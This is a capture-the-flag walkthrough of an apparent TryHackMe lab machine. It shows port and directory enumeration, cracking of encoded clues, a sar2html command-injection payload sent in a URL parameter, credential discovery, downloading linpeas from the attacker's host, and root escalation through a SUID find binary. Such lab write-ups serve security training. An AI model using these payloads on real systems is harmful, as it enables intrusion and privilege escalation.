I start with a quick port scan
```bash
 nmap -p- --min-rate=10000 10.10.2.181  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-28 16:25 EEST
Warning: 10.10.2.181 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.2.181
Host is up (0.25s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
55007/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 20.55 seconds
                                                                                                    
┌──(kali㉿kali)-[~]
└─$ nmap -p 21,80,55007 -sC -sV 10.10.2.181        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-28 16:30 EEST
Nmap scan report for 10.10.2.181
Host is up (0.32s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.25.159
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Apache2 Ubuntu Default Page: It works
55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
|_  256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.73 seconds
```

Ok se there ftp website and ssh. The ftp allowed for anonymous login and it had the following .txt inside
```bash
cat .info.txt          
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
```
I knew it was ROT13 encryption. It didn't reveal anything of use. 

```bash
Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
```

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -u http://10.10.2.181 -t 100 -x html,php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.2.181
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 290]
/.html                (Status: 403) [Size: 291]
/index.html           (Status: 200) [Size: 11321]
/manual               (Status: 301) [Size: 311] [--> http://10.10.2.181/manual/]
/joomla               (Status: 301) [Size: 311] [--> http://10.10.2.181/joomla/]
```

I did more enumartion on the /joomla and i found a few interesting things. Especially the /_files seemed interesting it had the string "VjJodmNITnBaU0JrWVdsemVRbz0K" inside. Now i must find what sort of encryption it has.

It had double base64 but it just revealed the string "Whopsie daisy" great.

the robots.txt had some interesting stuff
```bash
User-agent: *
Disallow: /

/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it

079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075

```

The following numbers were decimal and then it fas base64 which made it into a md5 cypher which is was able to crack with hashcat
```bash
hashcat -m 0 -a 0 hash /usr/share/wordlists/rockyou.txt  

99b0660cd95adea327c54182baa51584:kidding    
```
Seems like there are alot of pointless "traps"

```bash
gobuster dir -w /usr/share/wordlists/dirb/big.txt  -u http://10.10.2.181/joomla -t 150  
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.2.181/joomla
[+] Method:                  GET
[+] Threads:                 150
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 302]
/.htpasswd            (Status: 403) [Size: 302]
/_archive             (Status: 301) [Size: 320] [--> http://10.10.2.181/joomla/_archive/]
/_database            (Status: 301) [Size: 321] [--> http://10.10.2.181/joomla/_database/]
/_files               (Status: 301) [Size: 318] [--> http://10.10.2.181/joomla/_files/]
/_test                (Status: 301) [Size: 317] [--> http://10.10.2.181/joomla/_test/]
/administrator        (Status: 301) [Size: 325] [--> http://10.10.2.181/joomla/administrator/]
/bin                  (Status: 301) [Size: 315] [--> http://10.10.2.181/joomla/bin/]
/build                (Status: 301) [Size: 317] [--> http://10.10.2.181/joomla/build/]
/cache                (Status: 301) [Size: 317] [--> http://10.10.2.181/joomla/cache/]
/cli                  (Status: 301) [Size: 315] [--> http://10.10.2.181/joomla/cli/]
/components           (Status: 301) [Size: 322] [--> http://10.10.2.181/joomla/components/]
/images               (Status: 301) [Size: 318] [--> http://10.10.2.181/joomla/images/]
/includes             (Status: 301) [Size: 320] [--> http://10.10.2.181/joomla/includes/]
/installation         (Status: 301) [Size: 324] [--> http://10.10.2.181/joomla/installation/]
/language             (Status: 301) [Size: 320] [--> http://10.10.2.181/joomla/language/]
/layouts              (Status: 301) [Size: 319] [--> http://10.10.2.181/joomla/layouts/]
/libraries            (Status: 301) [Size: 321] [--> http://10.10.2.181/joomla/libraries/]
/media                (Status: 301) [Size: 317] [--> http://10.10.2.181/joomla/media/]
/modules              (Status: 301) [Size: 319] [--> http://10.10.2.181/joomla/modules/]
/plugins              (Status: 301) [Size: 319] [--> http://10.10.2.181/joomla/plugins/]
/templates            (Status: 301) [Size: 321] [--> http://10.10.2.181/joomla/templates/]
/tests                (Status: 301) [Size: 317] [--> http://10.10.2.181/joomla/tests/]
/tmp                  (Status: 301) [Size: 315] [--> http://10.10.2.181/joomla/tmp/]
/~www                 (Status: 301) [Size: 316] [--> http://10.10.2.181/joomla/~www/]
```



The _test website is hosting sar2html and it has a RCE.
https://www.exploit-db.com/exploits/47204

It pretty much allows you to run commands since it allows you to run arguments and it runs them throught the server,
```bash
http://10.10.2.181/joomla/_test/index.php?plot=;id

and it reveals the following
<option value="uid=33(www-data)" gid="33(www-data)" groups="33(www-data)">uid=33(www-data) gid=33(www-data) groups=33(www-data)</option>

http://10.10.2.181/joomla/_test/index.php?plot=;cat%20log.txt
```

Ok so we know that basterd;superduperp@$$

Now we had ssh access to the machine.

I improve the shell with python3 -c 'import pty;pty.spawn("/bin/bash")'

We also got the logins for the user stoner

stoner:superduperp@$$no1knows

I imported linpeas over. wget wasnt allowed so I just used curl.
```bash
stoner@Vulnerable:/tmp$ curl http://10.6.25.159:8000/linpeas.sh >linpeas.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  932k  100  932k    0     0   422k      0  0:00:02  0:00:02 --:--:--  422k
stoner@Vulnerable:/tmp$ chmod +x linpeas.sh
```

Some interesting things

sql
uid=1000(stoner) gid=1000(stoner) groups=1000(stoner),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid     
User stoner may run the following commands on Vulnerable:                                           
    (root) NOPASSWD: /NotThisTime/MessinWithYa

-r-sr-xr-x 1 root root 227K Feb  8  2016 /usr/bin/find


We can use find to escalate our priviledges since it runs as root it has the SUID bit set on

https://gtfobins.github.io/gtfobins/find/
```bash
SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

    sudo install -m =xs $(which find) .

    ./find . -exec /bin/sh -p \; -quit

```

```
stoner@Vulnerable:/usr/bin$ 
stoner@Vulnerable:/usr/bin$ ./find . -exec /bin/sh -p \; -quit
# whoami
root
# cd /root       
# ls -la
total 12
drwx------  2 root root 4096 Aug 22  2019 .
drwxr-xr-x 22 root root 4096 Aug 22  2019 ..
-rw-r--r--  1 root root   29 Aug 21  2019 root.txt
# cat root.txt
It wasn't that hard, was it?
# 
```

Great we got the root.txt before finding the user.txt. Nvm it was the .secret inside the user stoner. I was so used to the flags being in format thm{loremlipsum}
